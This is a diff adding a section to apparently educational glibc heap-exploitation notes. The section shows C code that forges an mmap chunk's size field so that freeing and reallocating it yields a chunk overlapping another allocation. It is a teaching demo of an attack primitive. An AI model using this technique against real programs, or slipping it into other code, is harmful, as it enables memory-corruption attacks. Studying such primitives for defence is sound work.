@@ -307,3 +307,32 @@ fprintf(stderr, "%s\n",(char *)p3);
 memset(p6,'F',1500);  
 fprintf(stderr, "%s\n",(char *)p3); 
 ```
+## mmap_overlaping_chunks
+```c
+//setup
+long long* top_ptr = malloc(0x100000);
+long long* mmap_chunk_2 = malloc(0x100000);
+long long* mmap_chunk_3 = malloc(0x100000);
+
+printf("\nCurrent System Memory Layout \n" \
+"================================================\n" \
+"running program\n" \
+"heap\n" \
+"....\n" \
+"third mmap chunk\n" \
+"second mmap chunk\n" \
+"LibC\n" \
+"....\n" \
+"ld\n" \
+"first mmap chunk\n"
+"===============================================\n\n" \
+);
+
+mmap_chunk_3[-1] = (0xFFFFFFFFFD & mmap_chunk_3[-1]) + (0xFFFFFFFFFD & mmap_chunk_2[-1]) | 2; // mmap_chunk_3->prev_size = 0x202002
+free(mmap_chunk_3); //merge
+long long* overlapping_chunk = malloc(0x300000);// overlapping chunk with mmap_chunk_2
+int distance = mmap_chunk_2 - overlapping_chunk;//0x40000
+
+overlapping_chunk[distance] = 0x1122334455667788;
+assert(mmap_chunk_2[0] == overlapping_chunk[distance]);
+```
